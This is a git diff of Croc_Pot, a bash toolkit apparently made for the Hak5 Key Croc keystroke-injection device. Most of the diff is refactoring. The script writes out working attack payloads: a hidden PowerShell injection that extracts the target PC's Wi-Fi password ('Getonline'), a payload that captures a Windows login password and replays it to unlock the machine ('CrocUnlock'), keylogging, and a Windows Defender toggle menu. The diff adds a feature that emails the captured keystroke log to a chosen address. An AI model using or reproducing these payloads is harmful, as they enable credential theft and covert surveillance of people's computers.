@@ -4,7 +4,7 @@
 # Title:         Croc_Pot
 # Description:   Email KeyCroc INFO & Log files & Nmap scan Plus save to loot folder and more
 # Author:        Spywill
-# Version:       1.2.6
+# Version:       1.2.8
 # Category:      Key Croc
 ##
 
@@ -40,6 +40,7 @@ fi
 green='\e[32m'
 blue='\e[34m'
 red='\e[31m'
+white='\e[97m'
 yellow='\e[93m'
 background='\e[40m'
 clear='\e[0m'
@@ -74,7 +75,7 @@ MenuColor() {
 }
 
 MenuEnd() {
-	echo -ne "\t\t\t\e[40;1m0${clear}${green})${clear}\e[40;4;32mEXIT              ${clear}
+	echo -ne "\t\t\t\e[40;1m0${clear}${green})${clear}\e[40;4;32mEXIT              ⮊${clear}
 \t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:') ${clear}"
 }
 
@@ -89,12 +90,12 @@ Info_Screen() {
 ##
 
 function croc_title() {
-	echo -ne "\n\n\e[41;30m${LINE}${clear}
-\e[40;31m${LINE_A}${clear}\e[40m>${clear}\e[40;31mKEYCROC${clear}\e[40m-${clear}\e[40;31mHAK${clear}\e[40m5${clear}\e[40m<${clear}\e[40;31m----------${clear}\e[41;30m=${clear}\e[40m${yellow}KeyCroc IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)               ${clear}
-\e[40;31m   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m               ${clear}\e[41;30m=${clear}\e[40m${yellow}KeyCroc VER: $(cat /root/udisk/version.txt)                    ${clear}
-\e[40;31m   DATE OF SCAN${clear}\e[40m ${DATE}${clear}\e[41;30m=${clear}\e[40m${yellow}KeyCroc keyboard: $(sed -n 9p /root/udisk/config.txt)         ${clear}
-\e[40;31m${LINE_A}${clear}\e[40;92m>CROC_POT<\e[40;31m--${clear}\e[40m${yellow}VER:1.2.6\e[40;31m---${clear}\e[41;30m=${clear}\e[40m${yellow}CPU TEMP: $(cat /sys/class/thermal/thermal_zone0/temp)°C  USAGE: $(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}')            ${clear}
-\e[41;30m${LINE}${clear}\n\n"	
+	echo -ne "\n\n\e[41;38;5;232m${LINE}${clear}
+\e[40;31m${LINE_A}${clear}\e[40m»${clear}\e[40;31mKEYCROC${clear}\e[40m-${clear}\e[40;31mHAK${clear}\e[40m❺ ${clear}\e[40m«${clear}\e[40;31m---------${clear}\e[41;38;5;232m♁${clear}\e[40m${yellow} KeyCroc IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)              ${clear}
+\e[40;31m   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m               ${clear}\e[41;38;5;232m§${clear}\e[40m${yellow} KeyCroc VER: $(cat /root/udisk/version.txt)                   ${clear}
+\e[40;31m   DATE OF SCAN${clear}\e[40m ${DATE}${clear}\e[41;38;5;232mΩ${clear}\e[40m${yellow} KeyCroc keyboard: $(sed -n 9p /root/udisk/config.txt)        ${clear}
+\e[40;31m${LINE_A}${clear}\e[40;92m»CROC_POT«\e[40;31m--${clear}\e[40m${yellow}VER:1.2.8\e[40;31m---${clear}\e[41;38;5;232mᛝ${clear}\e[40m${yellow} CPU TEMP: $(cat /sys/class/thermal/thermal_zone0/temp)°C  USAGE: $(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}')           ${clear}
+\e[41;38;5;232m${LINE}${clear}\n\n"	
 }
 
 function croc_title_loot() {
@@ -113,7 +114,7 @@ function invalid_entry() {
 function nmap_menu() {
 	IP_WLAN=$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)
 	LED SETUP
-	LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
+	local LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
 	    echo -ne "$(Info_Screen '
 -Start some basic nmap scan and save to loot folder\n
 -Enter IP for scan or default IP is 192.168.1.*\n')${clear}\n"
@@ -218,8 +219,8 @@ personal_scan() {
 ##
 
 pc_scan() {
-    CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
-    croc_os_v=/root/udisk/loot/Croc_OS_ip.txt
+    local CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
+    local croc_os_v=/root/udisk/loot/Croc_OS_ip.txt
     if [ -e "${CROC_OS_WIND}" ]; then
     croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}CONNECTED PC SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(sed -n 4p ${CROC_OS_WIND}) | tee -a ${LOOT_NMAP}
 else
@@ -270,7 +271,7 @@ MenuEnd
 ##
 
 function croc_logs_mean() {
-	LOOT_LOG=/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt
+	local LOOT_LOG=/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt
 	LED B
 	croc_title
 MenuTitle KEYCROC LOG MENU
@@ -318,8 +319,8 @@ MenuEnd
 
 function croc_mail() {
 	clear
-	PYTHON_MAIL=/root/udisk/tools/Croc_Pot/Croc_Mail.py
-	USER_CR=/root/udisk/tools/Croc_Pot/user_email.txt
+	local PYTHON_MAIL=/root/udisk/tools/Croc_Pot/Croc_Mail.py
+	local USER_CR=/root/udisk/tools/Croc_Pot/user_email.txt
 	LED B
 	echo -ne "$(Info_Screen '
 -Send E-Mail with g-mail or OutLook\n
@@ -344,8 +345,8 @@ MenuColor 3 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
 MenuEnd
         read mail
         case $mail in
-        1) GMAIL=smtp.gmail.com ; echo ${GMAIL} >> ${USER_CR} ;;
-        2) OUTLOOK=smtp-mail.outlook.com ; echo ${OUTLOOK} >> ${USER_CR} ;;
+        1) local GMAIL=smtp.gmail.com ; echo ${GMAIL} >> ${USER_CR} ;;
+        2) local OUTLOOK=smtp-mail.outlook.com ; echo ${OUTLOOK} >> ${USER_CR} ;;
         3) main_menu ;;
         0) exit 0 ;;
         *) invalid_entry ; user_smtp ;;
@@ -395,7 +396,6 @@ read -p "$(ColorBlue 'ENTER EMAIL TO SEND LOOT TO AND PRESS [ENTER]:') " E_MAIL_
 mail_file() {
 	clear
 python_v() {
-	LED B
         FILE_A_B="file_location_${CHANGE_FILE} ="
         FILE_B_B="filename_${CHANGE_FILE} = os.path.basename(file_location_${CHANGE_FILE})"
         FILE_C_B="attachment_${CHANGE_FILE} = open(file_location_${CHANGE_FILE}, 'rb')"
@@ -412,14 +412,13 @@ python_v() {
 ##
 
 send_file_a() {
-    LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
+    local LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
     if [ -e "${LOOT_NMAP}" ]; then
-    CHANGE_FILE="C"
-    CHANGE_FILE_A="'/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt'"
+    local CHANGE_FILE="C"
+    local CHANGE_FILE_A="'/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt'"
     python_v
     echo -ne "\e[40m$(ColorGreen 'THIS FILE') ${LOOT_NMAP} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})${clear}"
 else
-    LED R
     echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'PLEASE RUN AN NMAP SCAN FIRST STARTTING NMAP MENU')${clear}"${LINE_}
     nmap_menu
 fi
@@ -430,14 +429,13 @@ fi
 ##
 
 send_file_b() {
-    LOOT_LOG=/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt
+    local LOOT_LOG=/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt
     if [ -e "${LOOT_LOG}" ]; then
-    CHANGE_FILE="B"
-    CHANGE_FILE_A="'/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt'"
+    local CHANGE_FILE="B"
+    local CHANGE_FILE_A="'/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt'"
     python_v
     echo -ne "\e[40m$(ColorGreen 'THIS FILE') ${LOOT_LOG} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})${clear}"
 else
-    LED R
     echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'PLEASE RUN AN KEYCROC LOG SCAN FIRST STARTING CROC LOG MENU')${clear}"${LINE_}
     croc_logs_mean
 fi
@@ -448,14 +446,13 @@ fi
 ##
 
 send_file_c() {
-    LOOT_WIND=/root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt
+    local LOOT_WIND=/root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt
     if [ -e "${LOOT_WIND}" ]; then
-    CHANGE_FILE=""
-    CHANGE_FILE_A="'/root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt'"
+    local CHANGE_FILE=""
+    local CHANGE_FILE_A="'/root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt'"
     python_v
     echo -ne "\e[40m$(ColorGreen 'THIS FILE') ${LOOT_WIND} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})${clear}"
 else
-    LED R
     echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'PLEASE RUN AN WINDOWS LOG SCAN FIRST STARTTING WINDOWS LOG')${clear}"${LINE_}
     croc_pot_plus
 fi
@@ -466,33 +463,47 @@ fi
 ##
 
 send_file_d() {
-    LOOT_INFO=/root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt
+    local LOOT_INFO=/root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt
     if [ -e "${LOOT_INFO}" ]; then
-    CHANGE_FILE="D"
-    CHANGE_FILE_A="'/root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt'"
+    local CHANGE_FILE="D"
+    local CHANGE_FILE_A="'/root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt'"
     python_v
     echo -ne "\e[40m$(ColorGreen 'THIS FILE') ${LOOT_INFO} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})${clear}"
 else
-    LED R
     echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'PLEASE RUN AN KEYCROC STATUS SCAN FIRST STARTTING KEYCROC INFO SCAN ')${clear}"${LINE_}
     croc_status
 fi
 }
 
 ##
-#  - Mail Attachment Functions
+#  - Mail Attachment Function
 ##
 
 send_file_e() {
     read -p "$(ColorBlue 'ENTER THE PATH OF YOUR ATTACHMENT AND PRESS [ENTER]:') " ATT_PATH
     if [ -e "${ATT_PATH}" ]; then
-    CHANGE_FILE="P"
-    CHANGE_FILE_A="'${ATT_PATH}'"
+    local CHANGE_FILE="P"
+    local CHANGE_FILE_A="'${ATT_PATH}'"
     python_v
     echo -ne "\n\e[40m$(ColorGreen 'THIS FILE') ${ATT_PATH} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})${clear}\n"
 else
-    LED R
     echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed 'FILE DOES NOT EXIST PLEASE TRY AGAIN')${clear}${LINE_}\n"
+fi
+}
+
+##
+#  - Mail keystorkes Function
+##
+
+send_file_f() {
+    local KEY_ST=/root/udisk/loot/croc_char.log
+    if [ -e "${KEY_ST}" ]; then
+    local CHANGE_FILE="F"
+    local CHANGE_FILE_A="'/root/udisk/loot/croc_char.log'"
+    python_v
+    echo -ne "\e[40m$(ColorGreen 'THIS FILE') ${KEY_ST} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})${clear}"
+else
+    echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'DID NOT FIND croc_char.log')${clear}"${LINE_}
 fi
 }
 
@@ -506,7 +517,8 @@ MenuColor 2 KEYCROC LOG ; echo -ne "       ${clear}\n"
 MenuColor 3 WINDOW SCAN ; echo -ne "       ${clear}\n"
 MenuColor 4 KEYCROC INFO ; echo -ne "      ${clear}\n"
 MenuColor 5 ADD ATTACHMENT ; echo -ne "    ${clear}\n"
-MenuColor 6 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
+MenuColor 6 KEYSTORKES LOG ; echo -ne "    ${clear}\n"
+MenuColor 7 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
 MenuEnd
         read mail_A
         case $mail_A in
@@ -515,7 +527,8 @@ MenuEnd
         3) send_file_c ;;
         4) send_file_d ;;
         5) send_file_e ;;
-        6) main_menu ;;
+        6) send_file_f ;;
+        7) main_menu ;;
         0) exit 0 ;;
 	    *) invalid_entry ; mail_file ;;
         esac
@@ -527,10 +540,10 @@ MenuEnd
 
 python_email() {
 	LED B
-USER_EMAL=$(sed -n 2p ${USER_CR})
-USER_PASSWD=$(sed -n 3p ${USER_CR})
-USER_SEND=$(sed -n 4p ${USER_CR})
-USER_SMTP=$(sed -n 1p ${USER_CR})
+local USER_EMAL=$(sed -n 2p ${USER_CR})
+local USER_PASSWD=$(sed -n 3p ${USER_CR})
+local USER_SEND=$(sed -n 4p ${USER_CR})
+local USER_SMTP=$(sed -n 1p ${USER_CR})
 rm ${PYTHON_MAIL}
 sleep 1
 echo -ne "import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n
@@ -542,7 +555,6 @@ ${FILE_H_B}\nserver = smtplib.SMTP('${USER_SMTP}', 587)\nserver.starttls()\nserv
 text = msg.as_string()\nserver.sendmail(email, send_to_email, text)\nserver.quit()" >> ${PYTHON_MAIL}
 sleep 1
 python ${PYTHON_MAIL}
-LED FINISH
 }
 
 if [ -e "${USER_CR}" ]; then
@@ -565,10 +577,13 @@ fi
 read -p "$(ColorBlue 'ENTER A PERSONAL MESSAGE YES OR NO AND PRESS [ENTER]:') " MAIL_MESS
 	case $MAIL_MESS in
 	[yY] | [yY][eE][sS] )
+	            unset MY_MESS_A
+	            unset DEF_MESS
 			    read -p "$(ColorBlue 'ENTER YOUR MESSAGE AND PRESS [ENTER]:') " MY_MESS ;;
 	    [nN] | [nN][oO] )
-			    DEF_MESS=$(perl -e 'print "KEYCROC-HAK5---DEVELOPED BY SPYWILL ---Croc_Mail"')
-			    MY_MESS_A=${DEF_MESS} ;;
+	            unset MY_MESS
+			    local DEF_MESS=$(perl -e 'print "KEYCROC-HAK5---DEVELOPED BY SPYWILL ---Croc_Mail"')
+			    local MY_MESS_A=${DEF_MESS} ;;
 			   *) 
 			    invalid_entry ;;
 	esac
@@ -599,7 +614,7 @@ function croc_pot_plus() {
 ##
 
 tcpdump_scan() {
-    LOOT_TCPDUMP=/root/udisk/loot/Croc_Pot/tcpdump.pcap
+    local LOOT_TCPDUMP=/root/udisk/loot/Croc_Pot/tcpdump.pcap
     rm -f ${LOOT_TCPDUMP}
     	echo -ne "$(Info_Screen '
 -THIS WILL START TCPDUMP SCAN AND SAVE TO LOOT FOLDER\n
@@ -660,8 +675,8 @@ MenuEnd
 ##
 
 keystorkes_laptop() {
-    CROC_OS=/root/udisk/loot/Croc_OS.txt
-    OS_CHECK=$(sed -n 1p ${CROC_OS})
+    local CROC_OS=/root/udisk/loot/Croc_OS.txt
+    local OS_CHECK=$(sed -n 1p ${CROC_OS})
     echo -ne "\n${yellow}KeyCroc is pluged into OS${clear} --> $OS_CHECK\n"
     echo -ne "$(Info_Screen '
 -With this payload you can log Keystorkes from windows laptop pc\n
@@ -788,7 +803,6 @@ Q STRING "Test-KeyLogger"
 Q ENTER
 LED ATTACK
 else
-            LED R
             echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This Payload will not work on this OS')${LINE_}-->${clear}${OS_CHECK}\n"
 fi
 }
@@ -799,8 +813,8 @@ fi
 
 get_online_p() {
 	clear
-	GETONLINE=/root/udisk/payloads/Getonline.txt
-	echo -e "\n\e[40m${red}${LINE_}${clear}\e[40mINSTALLING PAYLOAD CALLED GETONLINE TO PAYLOAD FOLDER${red}${LINE_}${clear}\n"
+	local GETONLINE=/root/udisk/payloads/Getonline.txt
+	echo -e "\n\e[40m${red}***${clear}\e[40mINSTALLING PAYLOAD CALLED GETONLINE TO PAYLOAD FOLDER${red}***${clear}\n"
     echo -ne "$(Info_Screen '
 -Connect automatically to target pc WIFI (Windows)\n
 -After install unplug and plug into windows pc and type in getonline\n
@@ -808,12 +822,10 @@ get_online_p() {
 -The keycroc should now be connected to the target pc wifi\n')${clear}\n"
 
 	if [ -e "${GETONLINE}" ]; then
-	LED R
 	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'GETONLINE PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
 else
-	LED SETUP
-	GET_ON='label=\"KeyCroc\"'
-	GET_ON_A='\$Croc'
+	local GET_ON='label=\"KeyCroc\"'
+	local GET_ON_A='\$Croc'
 	echo -e "# Title:           Windows Get online\n# Description:     Get online automatically to target pc wifi or to your own wifi\n# Author:          spywill / RootJunky\n# Version:         2.3\n# Category:        Key Croc\n# Props:           Cribbit, Lodrix, potong\n#\n#" >> ${GETONLINE}
 	echo -e "MATCH getonline\nQ LOCK\n# --> udisk unmount\nATTACKMODE HID STORAGE\nsleep 5\nLED ATTACK\nQ GUI r\nsleep 1\n# --> Open powershell\nQ STRING \"powershell -NoP -NonI -W Hidden\"\nQ ENTER\nsleep 2\n# --> Get KeyCroc drive\nQ STRING \"${GET_ON_A} = (gwmi win32_volume -f '${GET_ON}' | Select-Object -ExpandProperty DriveLetter)\"" >> ${GETONLINE}
 	echo -e "Q ENTER\nsleep 2\n# --> Create wifipass.txt with the taget pc SSID and PASSWD put in Keycroc loot folder" >> ${GETONLINE}
@@ -822,8 +834,7 @@ else
 	echo "\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' root/udisk/config.txt) && \$(sed -i -E -e '1{x;s#^#sed -n 4p root/udisk/loot/Croc_Pot/wifipass.txt#e;x};10{G;s/\n(\S+).*/ \1/};11{G;s/\n\S+//}' -e 's/\r//g' root/udisk/config.txt)" >> ${GETONLINE}
 	echo -e "sleep 2\nQ UNLOCK\nLED FINISH" >> ${GETONLINE}
 	echo ""
-	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'GETONLINE PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}${LINE_}${clear}\n"
-	LED FINISH
+	echo -ne "\n\e[40m${red}***${clear}\e[40m$(ColorGreen 'GETONLINE PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}***${clear}\n"
 fi
 }
 
@@ -833,8 +844,7 @@ fi
 
 croc_unlock_p() {
 	clear
-	LED SETUP
-	CROCUNLOCK=/root/udisk/payloads/Croc_unlock_1.txt
+	local CROCUNLOCK=/root/udisk/payloads/Croc_unlock_1.txt
 	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40mINSTALLING PAYLOAD CALLED CROCUNLOCK TO PAYLOAD FOLDER${red}${LINE_}${clear}\n"
     echo -ne "$(Info_Screen '
 -Start by pressing GUI + L or CONTROL + ALT + DELETE\n
@@ -848,10 +858,8 @@ echo -ne "\n\e[40m$(ColorRed '
 --AFTER THE USER HAS ENTER THE PASSWORD\n
 --WORK FOR PIN NUMBER TO AS LONG AS THE ENTER KEY HAS BE PRESSED AFTER')\n"
 	if [ -e "${CROCUNLOCK}" ]; then
-	LED B
 	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'CROCUNLOCK PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
 else
-	LED SETUP
 	echo -e "# Title:           CrocUnlock (payload #1)\n# Description:     Log into windows pc\n# Author:          spywill / RootJunky\n# Version:         1.3\n# Category:        Key Croc\n#\n#\nMATCH (GUI-l|CONTROL-ALT-DELETE)\n#\nCROC_KEYS=/root/udisk/loot/Croc_Pot/Croc_unlock.txt.filtered\nCROC_UNLOCK=/root/udisk/payloads/Croc_unlock_2.txt\n#" >> ${CROCUNLOCK}
 	echo -e "if [ -e \"\${CROC_UNLOCK}\" ]; then\n     LED ATTACK\n     sleep 2\nSAVEKEYS /root/udisk/loot/Croc_Pot/Croc_unlock.txt UNTIL ENTER\n     LED FINISH\n     sleep 2\n     LED OFF;\nelse\n     LED SETUP" >> ${CROCUNLOCK}
 	printf '%s\n'     'echo -e "# Title:           CrocUnlock (PAYLOAD #2)\n# Description:     Log into windows pc\n# Author:          RootJunky / Spywill\n# Version:         1.3\n# Category:        Key Croc\n#\n#" >> ${CROC_UNLOCK}' >> ${CROCUNLOCK}
@@ -862,7 +870,6 @@ else
 	printf "%s\n"     "echo -e \"else\n      LED R\n      sleep1\n      Q STRING \\\$(sed '\\\$!d' \\\${CROC_KEYS})\n      Q ENTER\n      sleep 1\n      LED FINISH\n      sleep 2\n      LED OFF;\nfi;\n#\nrm -f /root/udisk/loot/Croc_Pot/Croc_unlock.txt\" >> \${CROC_UNLOCK}" >> ${CROCUNLOCK}
 	echo -e "     LED ATTACK\n     sleep 2\nSAVEKEYS /root/udisk/loot/Croc_Pot/Croc_unlock.txt UNTIL ENTER\n     LED FINISH\n     sleep 2\n     LED OFF;\nfi;" >> ${CROCUNLOCK}
 	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'CROCUNLOCK PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')\e[40m${red}${LINE_}${clear}\n"
-	LED FINISH
 fi
 }
 
@@ -872,31 +879,30 @@ fi
 
 wifi_setup_p() {
 	clear
-	LED SETUP
 	    echo -ne "$(Info_Screen '
 -WITH THIS PAYLOAD YOU CAN CREATE MULTIPLE WIFI SETTING\n
 -THE PURPOSE OF THIS PAYLOAD IS THAT IF YOU MOVE YOUR KEYCROC\n
--AROUND TO DIFFERENT WIFI ACCESS POINT\n
+-AROUND TO DIFFERENT WIFI ACCESS POINTS\n
 -YOU CAN CREATE A PAYLOAD WITH MATCH WORD\n
 -CONNECT TO WIFI ACCESS POINT QUICKLY\n
 -BY TYPING YOUR MATCH WORD\n')${clear}\n"
-            LED SETUP
             while read -p "$(ColorBlue 'ENTER A NAME FOR THIS PAYLOAD AND PRESS [ENTER]'): " USER_NAME_PL; do
-            PAYLOAD_FOLDER=/root/udisk/payloads/${USER_NAME_PL}.txt
+            local PAYLOAD_FOLDER=/root/udisk/payloads/${USER_NAME_PL}.txt
             if [[ -e "${PAYLOAD_FOLDER}" ]]; then
-            LED R
             echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed 'THIS PAYLOAD ALREADY EXISTS PLEASE CHOOSE A DIFFERENT NAME')${clear}${LINE_}\n"
 else
-            LED SETUP
             touch ${PAYLOAD_FOLDER}
             read -p "$(ColorBlue 'ENTER THE MATCH WORD YOU WOULD LIKE TO USE AND PRESS [ENTER]'): " USER_MATCH
             read -p "$(ColorBlue 'ENTER THE SSID AND PRESS [ENTER]'): " USER_SSID
             read -p "$(ColorBlue 'ENTER THE PASSWORD AND PRESS [ENTER]'): " WIFI_PASS
 echo -ne "# Title:         WIFI-SETUP\n# Description:   Setup your wifi with adding your ssid and passwd\n# Author:        spywill\n# Version:       1.3\n# Category:      Key Croc\n#\n#\n
 MATCH ${USER_MATCH}\nLED SETUP\n\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID ${USER_SSID} WIFI_PASS ${WIFI_PASS} SSH ENABLE' /root/udisk/config.txt)\nsleep 1\nLED FINISH" >> ${PAYLOAD_FOLDER}
-echo -ne "\n${red}${LINE_}${clear}$(ColorGreen 'WIFI_SET PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}${LINE_}${clear}\n
-$(ColorYellow '--UNPLUG THE KEYCROC AND PLUG BACK IN\n --TYPE IN YOUR MATCH WORD LED WILL LIGHT UP') ${green}GREEN${clear} $(ColorYellow 'THEN UNPLUG THE KEYCROC AND PLUG BACK IN\n --YOUR KEYCROC SHOULD NOW BE CONNECTED TO YOUR WIFI SETUP')\n"
-            LED FINISH
+echo -ne "\n${red}***${clear}$(ColorGreen 'WIFI_SET PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')${red}***${clear}\n
+$(Info_Screen '
+--UNPLUG THE KEYCROC AND PLUG BACK IN\n
+--TYPE IN YOUR MATCH WORD LED WILL LIGHT UP GREEN\n
+--THEN UNPLUG THE KEYCROC AND PLUG BACK IN\n
+--YOUR KEYCROC SHOULD NOW BE CONNECTED TO YOUR WIFI SETUP\n')${clear}\n"
             break
  fi
 done
@@ -934,17 +940,16 @@ start_win_stat() {
         sleep 3
         LED OFF
 }
-    LOOT_WIND=/root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt
-    WIN_PS=/root/udisk/tools/Croc_Pot/run.ps1
-    WIN_PS_A=/root/udisk/tools/Croc_Pot/info.ps1
-    CROC_OS=/root/udisk/loot/Croc_OS.txt
-    OS_CHECK=$(sed -n 1p ${CROC_OS})
+    local LOOT_WIND=/root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt
+    local WIN_PS=/root/udisk/tools/Croc_Pot/run.ps1
+    local WIN_PS_A=/root/udisk/tools/Croc_Pot/info.ps1
+    local CROC_OS=/root/udisk/loot/Croc_OS.txt
+    local OS_CHECK=$(sed -n 1p ${CROC_OS})
     echo -ne "\n${yellow}KeyCroc is pluged into OS${clear} --> $OS_CHECK\n"
     if [ "${OS_CHECK}" = WINDOWS ]; then
     if [[ -e "${WIN_PS}" && "${WIN_PS_A}" ]]; then
     start_win_stat | tee ${LOOT_WIND}
 else
-    LED SETUP
     sleep 1
 echo -ne "powershell \"Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue\"\n\n\$VolumeName = \"KeyCroc\"\n\$computerSystem = Get-CimInstance CIM_ComputerSystem\n\$backupDrive = \$null\nGet-WmiObject win32_logicaldisk | % {\n
 if (\$_.VolumeName -eq \$VolumeName) {\n        \$backupDrive = \$_.DeviceID\n    }\n}\n\n\$TARGETDIR = \$backupDrive + \"\loot\"\nif(!(Test-Path -Path \$TARGETDIR )){\n    New-Item -ItemType directory -Path \$TARGETDIR\n}\n\n\$TARGETDIR = \$backupDrive + \"\loot\Croc_Pot\"\nif(!(Test-Path -Path \$TARGETDIR )){\n   New-Item -ItemType directory -Path \$TARGETDIR\n}\n
@@ -973,9 +978,9 @@ computerCpu, computerMainboard,computerRamCapacity,\ncomputerRam,driveType,Hdds,
        start_win_stat | tee ${LOOT_WIND}
        fi
 else
-       LED R
        echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This Payload will not work on this OS')${LINE_} -->${clear} ${OS_CHECK}\n"
 fi
+cat ${LOOT_WIND}
 }
 
 ##
@@ -983,8 +988,8 @@ fi
 ##
 
 croc_vpn() {
-	vpn_file_A=/etc/openvpn/*.ovpn
-	vpn_file=/root/udisk/*.ovpn
+	local vpn_file_A=/etc/openvpn/*.ovpn
+	local vpn_file=/root/udisk/*.ovpn
 	echo -ne "$(Info_Screen '
 -First you will need to download the (filename.ovpn) file\n
 -from your VPN server of choice\n
@@ -997,8 +1002,8 @@ setup_vpn() {
 ##
 #   - VPN Check/install openvpn
 ##
-    pkg_vpn=openvpn
-	status_vpn="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg_vpn" 2>&1)"
+    local pkg_vpn=openvpn
+	local status_vpn="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg_vpn" 2>&1)"
 	if [ ! $? = 0 ] || [ ! "$status_vpn" = installed ]; then
 	apt install $pkg_vpn
 	fi
@@ -3791,8 +3796,8 @@ defender_disenable() {
 #   - Windows defender Menu
 ##
 
-	CROC_OS=/root/udisk/loot/Croc_OS.txt
-	OS_CHECK=$(sed -n 1p ${CROC_OS})
+	local CROC_OS=/root/udisk/loot/Croc_OS.txt
+	local OS_CHECK=$(sed -n 1p ${CROC_OS})
 	if [ "${OS_CHECK}" = WINDOWS ]; then
 MenuTitle WINDOWS DEFENDER
 MenuColor 1 ENABLE WINDOWS DEFENDER ; echo -ne "   ${clear}\n"
@@ -3834,7 +3839,7 @@ fi
 #   - Screen Croc_Shot Payload install
 ##
 
-    Croc_Shot=/root/udisk/payloads/Croc_Shot.txt
+    local Croc_Shot=/root/udisk/payloads/Croc_Shot.txt
     if [ -e "${Croc_Shot}" ]; then
       echo -ne "\n${LINE_}\e[40;m$(ColorGreen 'Croc_Shot.txt Payload is installed check payload folder')${clear}${LINE_}\n\n"
 else
@@ -3871,9 +3876,9 @@ read -p "$(ColorBlue 'TAKE SCREENSHOT NOW YES OR NO AND PRESS [ENTER]:') " CSN
 case $CSN in
   [yY] | [yY][eE][sS] )
     ATTACKMODE HID STORAGE
-	CROC_OS=/root/udisk/loot/Croc_OS.txt
-	WINDS_SHOT=/root/udisk/tools/Croc_Pot/winds_shot.ps1
-	OS_CHECK=$(sed -n 1p ${CROC_OS})
+	local CROC_OS=/root/udisk/loot/Croc_OS.txt
+	local WINDS_SHOT=/root/udisk/tools/Croc_Pot/winds_shot.ps1
+	local OS_CHECK=$(sed -n 1p ${CROC_OS})
 	if [ "${OS_CHECK}" = WINDOWS ]; then
 	 if [ -e "${WINDS_SHOT}" ]; then
 	 Q GUI r
